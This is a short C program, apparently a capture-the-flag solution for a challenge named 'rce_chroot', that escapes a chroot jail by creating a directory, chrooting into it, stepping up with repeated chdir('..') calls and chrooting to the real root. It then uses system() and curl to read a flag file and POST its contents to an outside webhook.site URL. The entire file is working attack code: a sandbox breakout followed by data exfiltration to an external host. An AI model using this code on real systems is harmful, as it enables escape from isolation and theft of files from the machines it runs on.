#include <sys/stat.h>
#include <stdlib.h>
#include <unistd.h>

int main(void) {
    mkdir("chroot-dir", 0755);
    chroot("chroot-dir");
    for (int i = 0; i < 1000; i++) {
        chdir("..");
    }
    chroot(".");
    system("curl -X POST -d \"flag=$(cat /home/case/Desktop/renew_tesi/challenge/web/advanced/rce_chroot/flag.txt)\" https://webhook.site/3a5aa390-d192-4ec8-932f-5109db0f428d");
    return 0;
}
